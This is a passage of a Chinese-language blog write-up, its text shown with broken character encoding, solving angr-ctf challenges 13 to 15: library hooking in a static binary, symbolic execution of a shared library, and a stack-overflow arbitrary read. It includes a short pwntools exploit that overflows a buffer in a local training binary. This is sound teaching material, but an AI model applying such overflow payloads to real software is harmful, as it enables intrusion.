<h1 id="0x06-angr-ctfï¼šåº“æ“ä½œ"><a href="#0x06-angr-ctfï¼šåº“æ“ä½œ" class="headerlink" title="0x06. angr-ctfï¼šåº“æ“ä½œ"></a>0x06. angr-ctfï¼šåº“æ“ä½œ</h1><h2 id="13-angr-static-binaryï¼šé™æ€ç¼–è¯‘å‡½æ•°æ›¿æ¢"><a href="#13-angr-static-binaryï¼šé™æ€ç¼–è¯‘å‡½æ•°æ›¿æ¢" class="headerlink" title="13_angr_static_binaryï¼šé™æ€ç¼–è¯‘å‡½æ•°æ›¿æ¢"></a>13_angr_static_binaryï¼šé™æ€ç¼–è¯‘å‡½æ•°æ›¿æ¢</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œè¿™æ¬¡è¿˜æ˜¯æƒ¯ä¾‹çš„è¯»å…¥è¾“å…¥åä½¿ç”¨ complex å‡½æ•°å¤„ç†åä¸å¾…å¯¹æ¯”å­—ç¬¦ä¸²è¿›è¡Œå¯¹æ¯”çš„æ¨¡å¼ï¼Œå’Œç¬¬ä¸€é¢˜åŸºæœ¬ä¸€æ ·ï¼Œä¸åŒçš„æ˜¯è¿™ä¸€æ¬¡çš„äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯é™æ€ç¼–è¯‘çš„</p>
<p><img src="https://s2.loli.net/2022/11/04/4IDZJ85bN2oV6BU.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç¬”è€…ä¸€å¼€å§‹ä¹Ÿæ²¡çœ‹æ˜ç™½è¦å¹²å•¥ï¼Œåé¢æ‹‰ç¬¬ä¸€é¢˜çš„è„šæœ¬è¿‡æ¥ç®€å•è·‘äº†ä¸€ä¸‹å‘ç°åŠå¤©æ²¡å‡ºç»“æœï¼Œçœ‹äº†çœ‹å‡ºé¢˜äººç•™ä¸‹çš„ <code>scaffold13.py</code> ä¸­æœ‰è¿™æ ·çš„è¯ï¼š</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># This challenge is the exact same as the first challenge, except that it was</span><br><span class="hljs-comment"># compiled as a static binary. Normally, Angr automatically replaces standard</span><br><span class="hljs-comment"># library functions with SimProcedures that work much more quickly.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># To solve the challenge, manually hook any standard library c functions that</span><br><span class="hljs-comment"># are used. Then, ensure that you begin the execution at the beginning of the</span><br><span class="hljs-comment"># main function. Do not use entry_state.</span><br></code></pre></td></tr></table></figure>

<p>å¤§æ¦‚å°±æ˜¯è¯´é€šå¸¸ angr ä¼šè‡ªåŠ¨å°†æ ‡å‡†åº“å½“ä¸­çš„å‡½æ•°æ›¿æ¢æˆ angr å†…å»ºçš„ SimProcedures ä¼ªå‡½æ•°ä»¥è·å¾—æ›´å¿«çš„è¿è¡Œé€Ÿåº¦ï¼Œä½†è¿™ä¸€æ¬¡æ˜¯é™æ€ç¼–è¯‘çš„é¢˜ç›®ï¼Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨è¿›è¡Œæ›¿æ¢ï¼›åŒæ—¶ç”±äºç¨‹åºè¿è¡Œèµ·å§‹æ˜¯ <code>__libc_start_main()</code> ï¼Œåœ¨è¿è¡Œåˆ° main ä¹‹å‰ä¼šèµ°å¾ˆå¤šä¸å¿…è¦çš„ä½†æ˜¯è¢«é™æ€ç¼–è¯‘è¿›æ¥çš„å¼¯è·¯ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨ä» main å¼€å§‹æ‰§è¡Œè€Œéç›´æ¥ä½¿ç”¨ <code>entry_state()</code> ï¼Œä¸è¿‡ç›´æ¥æ›¿æ¢æ‰ <code>__libc_start_main()</code> ä¹Ÿæ˜¯å¯ä»¥çš„</p>
<p>è·å– angr å†…ç½®åº“å‡½æ•°çš„æ–¹å¼æ˜¯ <code>angr.SIM_PROCEDURES[lib_name][function_name]</code> ï¼Œå’Œæˆ‘ä»¬ä¹‹å‰è‡ªå®šä¹‰çš„ hook å‡½æ•°ä¸€æ ·éƒ½æ˜¯ <code>SimProcedure</code> ç±»ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>project.hook(func_addr, sim_procedure_instance)</code> çš„æ–¹å¼è¿›è¡Œ hookï¼Œéœ€è¦æ³¨æ„çš„æ˜¯é™¤äº† <code>__libc_start_main</code> ä»¥å¤–çš„éœ€è¦è¢« hook çš„å‡½æ•°éƒ½æœ‰å¤§é‡å¼•ç”¨ï¼Œå› æ­¤ä¸è¦å›¾çœäº‹ç›´æ¥ä½¿ç”¨ <code>hook_symbol()</code></p>
<p>å› æ­¤æœ€åçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./13_angr_static_binary&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br><br>    <span class="hljs-comment"># hook the functions</span><br>    proj.hook(<span class="hljs-number">0x8051330</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;scanf&#x27;</span>]())<br>    proj.hook(<span class="hljs-number">0x80512E0</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;printf&#x27;</span>]())<br>    proj.hook(<span class="hljs-number">0x805EC90</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;puts&#x27;</span>]())<br>    proj.hook(<span class="hljs-number">0x806D530</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;strcmp&#x27;</span>]())<br>    proj.hook_symbol(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>, <br>                     angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;glibc&#x27;</span>][<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]())<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found :<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>è¿™ä¸€æ¬¡è§£é¢˜å¤§æ¦‚éœ€è¦åŠåˆ†é’Ÿå·¦å³</p>
<p><img src="https://s2.loli.net/2022/11/04/r6W9EHzQy8lGwXe.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ä»¥åŠç¬”è€…é‡åˆ°ä»¥ä¸‹å‡ ä¸ª<strong>ä¸è§£</strong>çš„ç‚¹ï¼š</p>
<ul>
<li>åœ¨å‡ºé¢˜äººç•™ä¸‹çš„ <code>scaffold13.py</code> ä¸­æç¤ºæˆ‘ä»¬åº”å½“å°†åˆå§‹çŠ¶æ€è®¾ä¸º main èµ·å§‹ï¼Œä½†ç¬”è€…è¿™ä¹ˆåšæ— æ³•è§£å‡ºé¢˜ç›®ï¼ˆä¼šç›´æ¥æŠŠç¬”è€…çš„é˜¿é‡Œäº‘å­¦ç”Ÿæœºå†…å­˜æ’‘çˆ†ï¼Œä½†è¿™æ˜¯ä¸åº”è¯¥å‘ç”Ÿçš„ï¼‰</li>
<li>åœ¨ <code>explore()</code> ä¸­å°† find ä¸ avoid è®¾ä¸ºæ£€æµ‹ stdout ä¸­å­—ç¬¦ä¸²çš„æ–¹å¼ä¼šæ¯”ç›´æ¥å¼•ç”¨åŸºæœ¬å—åœ°å€è¦å¿« 5s</li>
<li>ä½¿ç”¨ <code>veritesting=True</code> ä¼šå¤§å¹…å»¶é•¿è§£é¢˜æ—¶é—´ï¼ˆçœ‹èµ·æ¥ä¸ä¼šåƒåœ¨ç¬”è€…æœ‰ç”Ÿä¹‹å¹´è§£å‡ºçš„æ ·å­ï¼‰</li>
<li>ä½¿ç”¨ç›´æ¥ hook å‡½æ•°çš„æ–¹å¼å¯ä»¥è§£å‡ºé¢˜ï¼Œä½†ä½¿ç”¨ hook <code>main()</code> ä¸­ call æŒ‡ä»¤çš„æ–¹å¼<strong>æ— æ³•æ‰¾åˆ°è§£</strong></li>
<li>æ€»çš„è§£é¢˜æ—¶é—´æ¯”ç¬”è€…é¢„æƒ³ä¸­è¦é•¿å¾—å¤š</li>
</ul>
<h2 id="14-angr-shared-libraryï¼šåŠ¨æ€åº“çš„ç¬¦å·æ‰§è¡Œ"><a href="#14-angr-shared-libraryï¼šåŠ¨æ€åº“çš„ç¬¦å·æ‰§è¡Œ" class="headerlink" title="14_angr_shared_libraryï¼šåŠ¨æ€åº“çš„ç¬¦å·æ‰§è¡Œ"></a>14_angr_shared_libraryï¼šåŠ¨æ€åº“çš„ç¬¦å·æ‰§è¡Œ</h2><blockquote>
<p>è¿™ä¸€é¢˜çš„ç”Ÿæˆè„šæœ¬æœ‰ç‚¹é—®é¢˜ï¼Œç›´æ¥ä½¿ç”¨ä¼šæŠ¥ <code>No such file or directory </code>çš„ gcc errorï¼Œ è¿™æ˜¯å› ä¸ºåœ¨ç”Ÿæˆè„šæœ¬ä¸­çš„ <code>generate()</code> å‡½æ•°æœ€åä¸€è¡Œçš„ gcc å‘½ä»¤ä¸­çš„ <code>-L</code> å‚æ•°æœªæŒ‡å®šç›®å½•ï¼Œåœ¨åé¢åŠ ä¸€ä¸ª <code>.</code> æŒ‡å®šä¸ºå½“å‰ç›®å½•å³å¯</p>
</blockquote>
<p>æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œè¿™ä¸€æ¬¡åœ¨è¯»å–è¾“å…¥åè°ƒç”¨äº†è‡ªå®šä¹‰çš„ä¸€ä¸ªåŠ¨æ€é“¾æ¥çš„ <code>validate()</code> å‡½æ•°å¯¹è¾“å…¥è¿›è¡ŒéªŒè¯ï¼Œå…¶å®šä¹‰åœ¨è‡ªå®šä¹‰åº“ <code>lib14_angr_shared_library.so</code> å½“ä¸­</p>
<p><img src="https://s2.loli.net/2022/11/04/bZiq9ks4Klyf8Gz.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é‚£ä¹ˆè¿™é¢˜ç›´æ¥æš´åŠ› explore æ±‚è§£æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯è¿™ä¸æ˜¯æˆ‘ä»¬åšé¢˜çš„ç›®çš„ï¼šï¼‰</p>
<p>è¿™é¢˜å®é™…ä¸Šçš„ç›®çš„æ˜¯è®©æˆ‘ä»¬å¯¹åŠ¨æ€é“¾æ¥åº“è¿›è¡Œç¬¦å·æ‰§è¡Œæ±‚è§£ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†åˆå§‹çŠ¶æ€è®¾ä¸º <code>validate()</code>ï¼Œå°†ç»“æŸè®¾ä¸ºå‡½æ•°è¿”å›ï¼Œå¹¶æ·»åŠ å¯¹è¿”å›å€¼çš„çº¦æŸåè¿›è¡Œæ±‚è§£å³å¯</p>
<p>æˆ‘ä»¬ç°åœ¨æ¥é€†ä¸€ä¸‹è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œå…¶ä¸­å°±åªæ˜¯æ¯”è¾ƒç®€å•çš„ä¸€ä¸ª complex å¤„ç†çš„è¿‡ç¨‹è€Œå·²</p>
<p><img src="https://s2.loli.net/2022/11/04/oQyUL8W6hb2f9zl.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ¨¡æ‹Ÿè°ƒç”¨ <code>validate()</code> çš„è¿‡ç¨‹å³å¯ï¼Œæˆ‘ä»¬å…ˆç”¨ <code>claripy.BVS()</code> åˆ›å»ºä¸€ä¸ªè¡¨ç¤ºè¦æ±‚è§£çš„å­—ç¬¦ä¸²çš„ç¬¦å·å‘é‡ï¼Œå°†å…¶è½½å…¥åˆ°åˆå§‹çŠ¶æ€å†…å­˜ä¸­çš„ä¸€ä¸ªåœ°å€ä¸Šï¼Œä¹‹åå°†è¿™å—å†…å­˜çš„åœ°å€æ¨åˆ°æ ˆä¸Šä½œä¸º <code>validate()</code> çš„å‚æ•°å³å¯</p>
<p>æœ€åå°±æ˜¯ç›´æ¥ <code>explore()</code> åˆ°å‡½æ•°è¿”å›åæ·»åŠ  <code>eax == 1</code> çš„çº¦æŸåæ±‚è§£å³å¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ç”±äºè¿™æ˜¯ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨åˆ›å»º project æ—¶é€šè¿‡æŒ‡å®šåŠ è½½å‚æ•° <code>load_options</code> æ¥<strong>æ‰‹åŠ¨æŒ‡å®šåŠ è½½åŸºåœ°å€</strong>ï¼Œå…·ä½“å†™æ³•å‚ç…§ç¬”è€…çš„ exp</p>
<p>å› æ­¤æœ€ç»ˆçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./lib14_angr_shared_library.so&#x27;</span><br>    base_addr = <span class="hljs-number">0x400000</span><br>    proj = angr.Project(bin_path, load_options = &#123;<br>        <span class="hljs-string">&#x27;main_opts&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;custom_base_addr&#x27;</span>: base_addr<br>        &#125;<br>    &#125;)<br>    start_addr = base_addr + <span class="hljs-number">0x129C</span> <span class="hljs-comment"># addr of validate()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br><br>    password = claripy.BVS(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-number">8</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># 8 bytes</span><br>    password_addr = <span class="hljs-number">0x3000000</span><br>    init_state.memory.store(password_addr, password)<br><br>    <span class="hljs-comment"># emulate the process of calling validate(password, 8)</span><br>    init_state.regs.ebp = init_state.regs.esp<br>    init_state.stack_push(<span class="hljs-number">8</span>)<br>    init_state.stack_push(password_addr)<br>    init_state.stack_push(<span class="hljs-number">0xdeadbeef</span>)<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = base_addr + <span class="hljs-number">0x134B</span>)<br><br>    solution_state = simgr.found[<span class="hljs-number">0</span>]<br>    solution_state.add_constraints(solution_state.regs.eax == <span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(solution_state.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>è¿˜æ˜¯å·®ä¸å¤šç§’è§£ï¼š</p>
<p><img src="https://s2.loli.net/2022/11/05/vQi5PtLqbOVWrxa.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å½“ç„¶ï¼Œç¬”è€…è¿™é‡Œè°ƒç”¨å‡½æ•°çš„æ–¹æ³•æ¯”è¾ƒç²—çŠ·ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ angr æä¾›çš„ <code>project.factory.call_state(func_addr, args...)</code> æ¥åˆ›å»ºä¸€ä¸ªå‡½æ•°è°ƒç”¨çš„åˆå§‹çŠ¶æ€ï¼Œç”¨ä¾‹å†™æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><br>bin_path = <span class="hljs-string">&#x27;./test&#x27;</span><br>proj = angr.Project(bin_path)<br><br>func_addr = <span class="hljs-number">0xdeadbeef</span><br>init_state = proj.factory.call_state(func_addr, <span class="hljs-number">114514</span>, <span class="hljs-number">1919810</span>) <span class="hljs-comment"># func(114514, 1919810)</span><br></code></pre></td></tr></table></figure>

<h1 id="0x07-angr-ctfï¼šæ¼æ´åˆ©ç”¨"><a href="#0x07-angr-ctfï¼šæ¼æ´åˆ©ç”¨" class="headerlink" title="0x07. angr-ctfï¼šæ¼æ´åˆ©ç”¨"></a>0x07. angr-ctfï¼šæ¼æ´åˆ©ç”¨</h1><h2 id="15-angr-arbitrary-readï¼šæ ˆæº¢å‡ºå˜é‡è¦†ç›–"><a href="#15-angr-arbitrary-readï¼šæ ˆæº¢å‡ºå˜é‡è¦†ç›–" class="headerlink" title="15_angr_arbitrary_readï¼šæ ˆæº¢å‡ºå˜é‡è¦†ç›–"></a>15_angr_arbitrary_readï¼šæ ˆæº¢å‡ºå˜é‡è¦†ç›–</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œé€»è¾‘æ¯”è¾ƒç®€å•ï¼Œå¦‚æœç¬¬ä¸€ä¸ªæ•°ä¸æ˜¯ 42698355 æˆ–è€…ç¬¬ä¸€ä¸ªæ•°æ˜¯ 9507730 å°±è¾“å‡º <code>&quot;Try again.&quot;</code> ï¼Œå¦åˆ™è¾“å‡º s å­—ç¬¦ä¸²ï¼Œè€Œåœ¨è¯»å…¥åˆ° v4 æ—¶å­˜åœ¨ä¸€ä¸ªæ ˆæº¢å‡ºå¯ä»¥è¦†ç›– s æŒ‡é’ˆï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è®©å…¶è¾“å‡ºæŒ‡å®šåœ°å€ä¸Šçš„å­—ç¬¦ä¸²</p>
<p><img src="https://s2.loli.net/2022/11/05/Xm2yczB6WNTa1ex.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>è€Œä¼—æ‰€å‘¨çŸ¥ angr-ctf å½“ä¸­çš„é¢˜ç›®éƒ½è¦æˆ‘ä»¬è¾“å‡º <code>&quot;Good Job.&quot;</code> å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬åœ¨ IDA ä¸­å¯ä»¥å¾ˆå®¹æ˜“æ‰¾åˆ°ä»–çš„åœ°å€ï¼Œæ‰€ä»¥æœ€åçš„ exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    p = process(<span class="hljs-string">&#x27;./15_angr_arbitrary_read&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;42698355 &#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x10</span> + p32(<span class="hljs-number">0x58465157</span>))<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾— <code>&quot;Good Job.&quot;</code> </p>
<p><img src="https://s2.loli.net/2022/11/05/p3gPi9TYl1fuU6h.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>â€”â€”ä½†è¿™å¹¶ä¸æ˜¯æˆ‘ä»¬åšè¿™ä¸€é“é¢˜çš„ç›®çš„ï¼Œæˆ‘ä»¬åº”å½“ä½¿ç”¨ angr æ¥æ±‚è§£ï¼šï¼‰</p>
<p>é‚£ä¹ˆç”¨ angr è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿä¸€å¼€å§‹ç¬”è€…ä¹Ÿæ²¡å¤ªæƒ³æ˜ç™½ï¼Œåé¢æƒ³åˆ°æ—¢ç„¶è¾“å…¥çš„é•¿åº¦æ˜¯å·²çŸ¥çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ SimProcedure æ¥ hook æ‰ scanfï¼Œå°†è¾“å…¥ä½œä¸ºç¬¦å·ä½å‘é‡è¿›è¡Œæ±‚è§£ï¼ŒåŒæ—¶æˆ‘ä»¬åº”å½“ä¸ºç¬¬äºŒä¸ªè¾“å…¥å­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªå­—ç¬¦æ·»åŠ æˆå¯è§å­—ç¬¦çš„çº¦æŸ</p>
<p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>BVS.chop(bits=n)</code> æ¥å°†ç¬¦å·ä½å‘é‡æŒ‰ç…§ä¸€å®šå°ºå¯¸è¿›è¡Œåˆ†å‰²ï¼Œäºæ˜¯æœ€åçš„æ¨¡æ‹Ÿ scanf å†™æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MySimScanfProcedure</span>(angr.SimProcedure):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, <span class="hljs-built_in">str</span>, key_addr, chr_arr_addr</span>):<br>        key_bvs = claripy.BVS(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>        chr_arr_bvs = claripy.BVS(<span class="hljs-string">&#x27;chr_arr&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> chr_arr_bvs.chop(bits = <span class="hljs-number">8</span>):<br>            self.state.add_constraints(ch &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, ch &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>        self.state.memory.store(key_addr, key_bvs,<br>                                endness = proj.arch.memory_endness)<br>        self.state.memory.store(chr_arr_addr, chr_arr_bvs)<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_0&#x27;</span>] = key_bvs<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_1&#x27;</span>] = chr_arr_bvs<br><br>proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, MySimScanfProcedure())<br></code></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åˆ¤æ–­æˆ‘ä»¬çš„ç¬¦å·åŒ–å‘é‡æ˜¯å¦è·å¾—äº†æˆ‘ä»¬é¢„æœŸä¸­çš„ç»“æœï¼Œæˆ‘ä»¬è¿™ä¸€æ¬¡å°†è·¯å¾„æ¢ç´¢çš„ç»ˆç»“ç‚¹æ”¾åœ¨ <code>puts()</code>ï¼Œå¹¶åˆ¤æ–­å…¶å‚æ•°æ˜¯å¦ä¸º <code>&quot;Good Job.&quot;</code> å­—ç¬¦ä¸²çš„åœ°å€ï¼š</p>
<ul>
<li>ä½¿ç”¨ <code>state.memory.load()</code> å°† <code>puts()</code> çš„å‚æ•°æå–å‡ºæ¥</li>
<li>ä½¿ç”¨ <code>state.solver.symbolic()</code> åˆ¤æ–­ <code>puts()</code> çš„å‚æ•°æ˜¯å¦æ˜¯æˆ‘ä»¬çš„ BVS</li>
<li>ä½¿ç”¨ <code>state.copy()</code> è·å–å½“å‰çŠ¶æ€çš„å‰¯æœ¬ï¼Œä¹‹ååœ¨è¯¥å‰¯æœ¬ä¸Šæ·»åŠ çº¦æŸä»¥é¿å…å½±å“åˆ°åŸçŠ¶æ€</li>
<li>ä½¿ç”¨ <code>state.satisfiable()</code> åˆ¤æ–­æ˜¯å¦æ»¡è¶³çº¦æŸï¼Œè‹¥æ˜¯åˆ™æ·»åŠ åˆ°åŸçŠ¶æ€ä¸­æ±‚è§£å³å¯</li>
</ul>
<p>æ–¹ä¾¿èµ·è§ï¼Œè¿™é‡Œç¬”è€…å°†æœç´¢çš„åœ°å€è®¾ä¸º <code>puts()</code> å‡½æ•°çš„ plt è¡¨åœ°å€ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>    call_puts_addr = <span class="hljs-number">0x8049090</span><br>    <span class="hljs-keyword">if</span> state.addr != call_puts_addr:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    good_str_addr = <span class="hljs-number">0x58465157</span><br>    puts_param = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>,<br>                                   endness = proj.arch.memory_endness)<br>    <span class="hljs-keyword">if</span> state.solver.symbolic(puts_param):<br>        copy_state = state.copy()<br>        copy_state.add_constraints(puts_param == good_str_addr)<br>        <span class="hljs-keyword">if</span> copy_state.satisfiable():<br>            state.add_constraints(puts_param == good_str_addr)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>simgr.explore(find = is_success)<br></code></pre></td></tr></table></figure>

<p>é™¤äº†é€šè¿‡å¤åˆ¶çŠ¶æ€åæ·»åŠ çº¦æŸå¹¶åˆ¤æ–­çš„æ–¹æ³•ä»¥å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ä¸º <code>state.satisfiable()</code> æŒ‡å®š <code>extra_constraints</code> å‚æ•°çš„æ–¹å¼æ¥åœ¨ä¸å½±å“çŠ¶æ€æœ¬èº«å·²æœ‰çº¦æŸé›†çš„çŠ¶æ€ä¸‹è¿›è¡Œçº¦æŸåˆ¤æ–­ï¼Œå› æ­¤ä¸Šé¢çš„ is_success() å‡½æ•°ä¹Ÿå¯ä»¥å†™æˆå¦‚ä¸‹å½¢å¼ï¼š</p>
